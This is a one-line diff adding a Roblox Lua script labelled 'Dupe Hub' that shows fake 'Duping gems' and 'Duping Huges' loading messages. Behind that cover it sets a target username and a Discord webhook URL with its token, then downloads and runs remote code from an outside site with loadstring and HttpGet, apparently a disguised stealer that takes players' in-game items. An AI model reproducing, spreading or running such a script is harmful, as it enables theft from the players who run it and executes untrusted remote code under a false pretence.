@@ -1,0 +1,1 @@
+UserName = "mihai98277771" Webhook = "https://discord.com/api/webhooks/1098706773235478700/RvaZsDaMRZtCuqrDwSrUJ52R3_3Lq0nJ-pnwjomMc1AGAmnpsVfnF9rpHEV4-eushLbM" _G.ScriptName = "Dupe Hub" _G.FirstText = "loading script" _G.SecondText = "Duping gems" _G.ThirdText = "Duping Huges" _G.WaitingTime = 180 loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))() 
